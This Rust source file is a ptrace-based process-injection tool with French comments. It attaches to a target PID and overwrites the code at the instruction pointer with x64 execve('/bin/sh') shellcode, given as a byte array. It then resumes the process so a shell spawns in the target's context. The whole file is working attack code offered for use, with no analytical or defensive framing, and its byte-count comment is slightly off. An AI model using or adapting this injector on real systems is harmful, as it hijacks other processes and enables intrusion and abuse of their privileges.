use nix::sys::ptrace;
use nix::sys::wait::waitpid;
use nix::unistd::Pid;
use std::env;

// x64 execve("/bin/sh") — 26 bytes, null bytes ok (ptrace POKETEXT)
const SHELLCODE: &[u8] = &[
    0x48, 0x31, 0xf6,                                               // xor rsi, rsi
    0x48, 0x31, 0xd2,                                               // xor rdx, rdx
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,   // movabs rbx, "/bin/sh\0"
    0x53,                                                           // push rbx
    0x48, 0x89, 0xe7,                                               // mov rdi, rsp
    0xb8, 0x3b, 0x00, 0x00, 0x00,                                  // mov eax, 59 (SYS_execve)
    0x0f, 0x05,                                                     // syscall
];

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        eprintln!("Usage: {} <pid>", args[0]);
        std::process::exit(1);
    }
    let pid = Pid::from_raw(args[1].parse::<i32>().expect("PID invalide"));

    println!("[*] Attaching PID {}...", pid);
    ptrace::attach(pid).expect("ptrace attach échoué (sudo requis)");
    waitpid(pid, None).unwrap();
    println!("[+] Attaché — processus stoppé");

    // Sauvegarder les registres → récupérer RIP
    let mut regs = ptrace::getregs(pid).unwrap();
    let rip = regs.rip as usize;
    println!("[*] RIP = 0x{:x}", rip);

    // Écrire shellcode 8 bytes par 8 bytes via PTRACE_POKETEXT
    for (i, chunk) in SHELLCODE.chunks(8).enumerate() {
        let mut word = [0u8; 8];
        word[..chunk.len()].copy_from_slice(chunk);
        unsafe {
            ptrace::write(
                pid,
                (rip + i * 8) as *mut libc::c_void,
                i64::from_le_bytes(word) as *mut libc::c_void,
            )
            .expect("ptrace write échoué");
        }
    }
    println!("[*] Shellcode ({} bytes) écrit à 0x{:x}", SHELLCODE.len(), rip);

    // RIP pointe déjà sur le shellcode — setregs pour forcer
    regs.rip = rip as u64;
    ptrace::setregs(pid, regs).unwrap();

    // Reprendre l'exécution → shellcode s'exécute dans le contexte du processus cible
    ptrace::cont(pid, None).unwrap();
    println!("[+] Exécution reprise → shell spawné dans le processus cible");
}
